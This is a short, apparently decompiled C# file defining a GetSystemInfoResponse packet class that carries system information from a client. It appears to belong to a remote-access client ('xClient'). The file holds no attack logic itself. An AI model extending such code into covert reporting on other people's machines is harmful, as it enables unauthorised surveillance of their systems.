using System;

namespace xClient.Core.Packets.ClientPackets;

[Serializable]
public class GetSystemInfoResponse : GInterface4
{
	public string[] SystemInfos { get; set; }

	public GetSystemInfoResponse()
	{
	}

	public GetSystemInfoResponse(string[] systeminfos)
	{
		SystemInfos = systeminfos;
	}

	public void Execute(GClass33 client)
	{
		client.method_7(this);
	}
}
